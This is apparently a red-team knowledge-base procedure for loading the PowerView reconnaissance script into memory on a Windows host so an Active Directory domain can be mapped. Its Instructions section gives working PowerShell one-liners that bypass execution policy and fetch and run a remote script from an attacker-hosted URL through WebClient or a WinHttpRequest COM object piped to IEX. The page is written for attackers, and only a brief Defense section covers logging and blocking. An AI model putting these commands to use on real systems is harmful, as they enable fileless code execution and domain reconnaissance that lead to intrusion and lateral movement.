---
type: procedure
description: >-
  Downloads and executes the PowerView PowerShell script from a remote location
  to enable Active Directory reconnaissance capabilities.
verified: true
submitted: false
created_at: '2023-10-01T00:00:00Z'
updated_at: '2023-10-01T00:00:00Z'
tactics:
  - '[[Execution]]'
techniques:
  - '[[PowerShell]]'
sub_techniques: []
tags:
  - powershell
  - active-directory
  - reconnaissance
  - load-scripts
commands:
  - '[[commands/Download-and-Execute-PowerView-Proxy-Aware]]'
  - '[[commands/Download-and-Execute-PowerView-Non-Proxy-Aware]]'
platforms:
  - Windows
tools:
  - '[[tools/PowerView]]'
skill_level: intermediate
impact_level: medium
detection_risk: high
validated: true
---

# Download-and-Execute-PowerView-Script

## Summary

This procedure downloads and executes the PowerView PowerShell script from a remote server directly into memory, allowing attackers to perform Active Directory enumeration and reconnaissance without writing files to disk. It provides methods for both proxy-aware and non-proxy-aware environments, leveraging PowerShell's Invoke-Expression (IEX) to load the script's functions for subsequent domain queries.

## Description

PowerView is a pure PowerShell toolkit for Active Directory reconnaissance, enabling enumeration of users, groups, computers, and trusts. This procedure uses web download methods to fetch the script (typically hosted on an attacker-controlled server) and executes it in the current PowerShell session. The proxy-aware variant handles corporate proxies by configuring credentials, while the non-proxy variant uses COM objects to bypass proxy settings. This technique evades file-based detection but can be identified through PowerShell logging. It is commonly used post-initial access to map the domain for lateral movement.

## Requirements

1. Administrative or user-level access to a Windows system with PowerShell 2.0 or later.
2. Network connectivity to the remote server hosting the PowerView.ps1 script (outbound HTTP/HTTPS allowed).
3. For proxy-aware execution, domain credentials that can authenticate to the proxy.
4. [[tools/PowerView]] script file hosted externally (e.g., on an attacker web server).

## Defense

- Enable PowerShell Script Block Logging and Module Logging to capture IEX and download activity.
- Implement Constrained Language Mode or AppLocker to restrict unsigned script execution.
- Monitor network traffic for PowerShell downloads from external IPs and block unauthorized outbound connections.
- Use endpoint detection tools to alert on WinHttpRequest COM object usage or WebClient proxy configurations.

## Objectives

1. Load PowerView functions into the PowerShell session without disk writes.
2. Enable reconnaissance of Active Directory objects like users and groups.
3. Support execution in varied network environments (proxied or direct).
4. Verify successful load by invoking a basic PowerView function.

## Instructions

### Step 1: Determine Network Environment

**Context**: Assess if the target system uses a proxy to route outbound traffic. This determines which download method to use. Query proxy settings via PowerShell or check system configuration.

**Command** (use built-in PowerShell, no specific command doc):
```powershell
netsh winhttp show proxy
```

> This command displays current proxy settings. If a proxy is configured, proceed to proxy-aware method; otherwise, use non-proxy.

### Step 2: Execute Proxy-Aware Download (If Applicable)

**Context**: For environments behind a proxy, use this method to authenticate and download the script. It configures the WebClient to use default network credentials for proxy access and invokes the script via IEX.

**Command** ([[commands/Download-and-Execute-PowerView-Proxy-Aware]]):
```powershell
powershell -exec bypass -c "(New-Object Net.WebClient).Proxy.Credentials=[Net.CredentialCache]::DefaultNetworkCredentials;iwr('$_URL/PowerView.ps1')|iex"
```

> Replace $_URL with your hosting IP/domain. The -exec bypass flag evades execution policy. Expected: No output if successful; PowerView functions now available (e.g., Get-NetDomain).

### Step 3: Execute Non-Proxy-Aware Download (If Applicable)

**Context**: For direct internet access without proxies, use the WinHttpRequest COM object to fetch and execute the script. This avoids WebClient proxy detection.

**Command** ([[commands/Download-and-Execute-PowerView-Non-Proxy-Aware]]):
```powershell
$h = new-object -com WinHttp.WinHttpRequest.5.1; $h.open('GET', '$_URL/PowerView.ps1', $false); $h.send(); iex $h.responseText
```

> Replace $_URL with your hosting location. The $false parameter disables proxy usage. Expected: Silent execution; test with Get-NetDomain to confirm load.

### Step 4: Verify PowerView Load

**Context**: Confirm the script loaded by running a simple enumeration command. This ensures functions are available for further recon.

**Command** (use built-in PowerView function, no specific command doc):
```powershell
Get-NetDomain
```

> If PowerView loaded, this returns domain details. If error (e.g., 'Get-NetDomain: Command not found'), reload the script.
